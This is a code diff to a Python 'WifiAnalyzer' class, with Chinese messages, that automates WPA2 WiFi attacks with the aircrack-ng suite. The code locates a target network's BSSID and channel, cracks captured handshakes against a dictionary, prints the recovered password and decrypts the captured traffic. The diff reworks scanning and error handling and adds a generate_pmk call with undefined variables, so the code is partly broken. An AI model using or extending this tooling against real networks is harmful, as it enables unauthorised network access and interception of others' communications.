@@ -76,31 +76,6 @@ class WifiAnalyzer:
                 capture_output=True, text=True, timeout=10  # 扫描所有常见信道，10秒后停止
             )
             
-            # 从扫描结果中提取BSSID和信道
-            scan_file = "/tmp/scan-01.csv"
-            if os.path.exists(scan_file):
-                with open(scan_file, "r", encoding="utf-8", errors="ignore") as f:
-                    for line in f:
-                        if self.ssid in line and "WPA2" in line:
-                            parts = line.strip().split(",")
-                            self.bssid = parts[0].strip()  # BSSID（路由器MAC）
-                            self.channel = parts[3].strip()  # 信道
-                            break
-                os.remove(scan_file)  # 删除临时扫描文件
-            
-            # 验证扫描结果
-            if not self.bssid or not self.channel:
-                print(f"[WARNING] 自动扫描失败，请手动输入目标WiFi的BSSID和信道")
-                self.bssid = input("[+] 请输入目标WiFi的BSSID (如94:90:10:8d:14:50): ").strip()
-                self.channel = input("[+] 请输入目标WiFi的信道 (如36): ").strip()
-            else:
-                print(f"[✅] 自动扫描成功！目标BSSID: {self.bssid}，信道: {self.channel}")
-
-            # 锁定信道（避免airodump-ng跳信道）
-            subprocess.run(["sudo", "iwconfig", self.monitor_interface, "channel", self.channel], check=True)
-            print(f"[*] 监控模式初始化完成：接口={self.monitor_interface}，BSSID={self.bssid}，信道={self.channel}")
-            return True
-            
         except subprocess.CalledProcessError as e:
             print(f"[ERROR] 设置监控模式失败: {e.stderr}")
             return False
@@ -294,10 +269,8 @@ class WifiAnalyzer:
                     match = re.search(r"KEY FOUND! \[ (.*?) \]", line)
                     if match:
                         key_found = match.group(1)
-                elif "No matching PMKID found" in line or "No key found" in line:
-                    error_message = "字典中无匹配密码"
-                elif "Not enough EAPOL packets" in line:
-                    error_message = "握手包不完整"
+                elif "Packets contained no EAPOL data; unable to process this AP." in output_line:
+                    error_message = output_line.strip()
         
         except Exception as e:
             key_found = None
@@ -319,8 +292,14 @@ class WifiAnalyzer:
                 self.wifi_password = password
                 print(f"[✅] 破解成功！WiFi密码: {self.wifi_password}")
                 return True  # 破解成功则停止，无需试其他文件
-            else:
+            elif err:
+                print("[ERROR]:", err)
+                print("[ERROR]：破解WiFi密码失败,抓包文件中缺少必要的四次握手数据")
+                sys.exit(1)
+            elif err is None and password is None:
                 print(f"[❌] 第{idx}个文件破解失败: {err}")
+                print("[Error] 离线字典破解密码失败，无法破解Wifi密码，后续程序无法执行，请丰富离线字典！")
+                sys.exit(1)
         
         # 所有文件都破解失败
         print(f"\n[ERROR] 所有捕获文件破解失败（可能原因：字典无密码/握手包无效）")
@@ -365,6 +344,7 @@ class WifiAnalyzer:
             return None
         
         print(f"[*] 用密码 {self.wifi_password} 解密 {pcap_file}...")
+        pmk = generate_pmk(password, ssid)
         output_file = os.path.join(OUTPUT_DIR, "decrypted.pcap")
         try:
             # 用airdecap-ng解密（与airodump-ng配套）
